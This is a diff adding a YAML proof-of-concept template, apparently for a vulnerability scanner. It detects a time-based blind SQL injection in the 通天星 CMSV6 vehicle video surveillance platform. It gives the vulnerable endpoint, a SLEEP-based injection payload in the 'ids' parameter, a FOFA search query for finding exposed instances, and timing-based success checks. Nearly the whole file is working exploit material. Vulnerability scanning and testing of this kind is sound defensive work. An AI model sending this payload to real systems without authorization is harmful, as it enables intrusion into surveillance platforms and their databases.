@@ -1,0 +1,26 @@
+id: poc-yaml-g-sky-cmssv6-disable-sqli
+info:
+  name: 通天星CMSV6车载视频监控平台 disable SQL注入
+  severity: high
+  tags:
+  - sql-injection
+  finger: cmsv6
+  fofa: body="/808gps/"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: GET
+  path: /edu_security_officer/disable;downloadLogger.action?ids=1+AND+%28SELECT+2688+FROM+%28SELECT%28SLEEP%28{{.t1}}%29%29%29kOIi%29
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  expression: 'status_code == 200 &&
+
+    duration >= t1 &&
+
+    duration <= t2 &&
+
+    contains(body,"\"message\":\"OK\"")
+
+    '
+transport: http
